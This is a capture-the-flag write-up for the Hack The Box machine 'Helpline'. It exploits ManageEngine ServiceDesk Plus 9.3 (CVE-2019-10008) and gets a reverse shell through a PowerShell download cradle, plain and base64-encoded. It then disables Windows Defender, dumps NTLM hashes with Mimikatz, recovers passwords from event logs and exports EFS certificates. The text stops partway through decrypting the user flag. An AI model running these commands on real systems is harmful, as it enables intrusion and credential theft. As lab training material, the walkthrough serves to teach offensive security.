# Helpline

This is the write-up for the box Helpline that got retired at the 17th August 2019.
My IP address was 10.10.13.230 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.132    helpline.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/helpline.nmap 10.10.10.132
```

```markdown
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
8080/tcp open  http-proxy    -
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=95A3A72E00D0F838E1ACBDF21ECD3923; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Sun, 25 Aug 2019 12:30:20 GMT
|     Connection: close
|     Server: -
```

## Checking HTTP (Port 8080)

On this page we see some Help Desk Software from **ManageEngine ServiceDesk Plus** in the version 9.3.
So lets look for exploits:

```markdown
searchsploit servicedesk 9.3
```

There are some exploits for this software. The privilege escalation exploit _exploits/jsp/webapps/46659.py_ looks good but first we need a username.
If we google for default users for this software, we will get result or another way is to get valid usernames with fuzzing:

```markdown
wfuzz -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -u 'http://10.10.10.132:8080/domainServlet/AJaxDomainServlet?action=searchLocalAuthDomain&timestamp=Sun%20Aug%2025%202019%2015:42:43%20GMT+0200%20(CEST)&search=FUZZ'
```

The usernames _administrator_ and _guest_ with the password _guest_ works.

### CVE-2019-10008

The exploit script uses the vulnerability CVE-2019-10008 and this is what we need to understand first.
It is explained on the founders page: [GitHub page for CVE-2019-10008](https://github.com/FlameOfIgnis/CVE-2019-10008).

Optional:
> To understand every step of this script fully, you can send every request through Burpsuite. Put the following line in the **.curlrc** file and every request gets through Burpsuite:

```markdown
proxy = http://127.0.0.1:8080
```

In the script change the hostname to the IP address of the box and execute it.
It will give us two cookies that we need to replace with out current ones. Put the values given from the script for _JSESSIONSSO_ and JSESSIONID_ and refresh the page.
After that we will be logged in as administrator.

### Getting a reverse shell

Now we are logged in as administrator and want a reverse shell on the box. There is a way to execute code on this webpage.

In the **Admin** page there is a field named **Custom Triggers**. Create a custom trigger like this:
```markdown
Execute the Action: When a Request is created - Any Time
Match criteria: Sender is not whatever
Action Type: Execute Script: cmd /c powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.13.230/shell.ps1')
```

_Shell.ps1_ is just the standard reverse shell from Nishand called _Invoke-PowerShellTcp.ps1_.
It is important that there is only one trugger or else it won't work well.

Optional:
> We can minimize the types of characters we are sending, to not get into a input filter:

```markdown
Base64 decode command:
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.13.230/shell.ps1')" | iconv -t UTF-16LE  | base64 -w 0

Put this command into the web application:
cmd /c powershell -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMwAuADIAMwAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAAoA
```

After listening the port 9001 (which I choose in shell.ps1) we get a reverse shell!

## Privilege Escalation

Now as we have a shell on the box lets try to increase our privileges. We are logged in as **NT Authority/SYSTEM** but can
t read any flags. With the following command we can see what is wrong with that:

```markdown
cipher /c C:\Users\Administrator\Desktop\root.txt
```

This command shows us that only the user _Administrator_ can read it. This box uses **Encrypted File System** which is an built-in encryption in Windows.

Lets check for files in the home folders:

```markdown
gci -recurse | select fullname
```

Interesting files:
- C:\Users\tolu\Desktop\user.txt
  - Only _tolu_ can decrypt it
- C:\Users\leo\Desktop\admin-pass.xml
  - Only leo can decrypt it
  
So this means that we actually have to decrypt some stuff. In that case we drop Mimikatz on the box:

```markdown
IWR -uri hxxp://10.10.13.230/mimikatz.exe -outfile mimikatz.exe
```

Execution of this won*t work because of Windows Defender but we can disable that quickly:

```markdown
Set-MpPreference -DisableRealTimeMonitoring $true
```

Now dump NTLM passwords:

```markdown
.\mimikatz “token::elevate” “lsadump:sam” “exit”
```

Here are the hashes we get and want to crack or look for:
- Administrator:d5312b245d641b3fae0d07493a022622
- alice:998a9de69e883618e987080249d20253
- zachary:eef285f4c800bcd1ae1e84c371eeb282
- niels:35a9de42e66dcdd5d512a796d03aef50
- leo:60b05a66232e2eb067b973c889b615dd
- tolu:03e2ec7aa7e82e479be07ecd34f1603b

The only hash that could be found on hashes.org was from the user _zachary_. His password is:
> 0987654321

Looking for his groups:

```markdown
net user zachary
```

The user is member of the group **Event Log Readers**. There is a nice script on GitHub to process events on Windows:
[Get-WinEventData](https://github.com/RamblingCookieMonster/PowerShell/blob/master/Get-WinEventData.ps1)

```markdown
IEX(New-Object Net.WebClient).downloadString('http://10.10.13.230/Get-WinEventData.ps1')
$x = Get-WinEvent -FilterHashTable @{Logname='security';id=4688} | Get-WinEventData
Get-WinEvent -FilterHashTable @{Logname='security';id=4688} -MaxEvents 1 | Get-WineventData | fl *
Get-WinEvent -FilterHashTable @{Logname='security';id=4688} | Get-WineventData | select e_CommandLine | ft -autosize -wrap
```

In the output of the last command we can find this information:
> /USER:tolu !zaq1234567890pl!99

Now we have the password for _tolu_ and can decrypt the EFS for user.txt.

### Getting user.txt

We need the thumbprint of the file:
```markdown
cipher /c C:\Users\tolu\Desktop\user.txt
```

It is:
> 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29

If we compare that to the users certificate we see that it is the same string. Location of certificate:
> C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29

There is a tutorial on [how to decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) and I will go through these steps.

Getting the certificate:
```markdown
.\mimikatz "crypto::system /file:C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29 /export" "exit"
```

We now have the certificate the its **public key** as a .der file. Get this on our client with a SMB server:

```markdown
impacket-smbserver -smb2support -user test -password test test $(pwd)

Copy the file to our machine:
net use Y: \\10.10.13.230\test /user:test test
copy 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der Y:
```
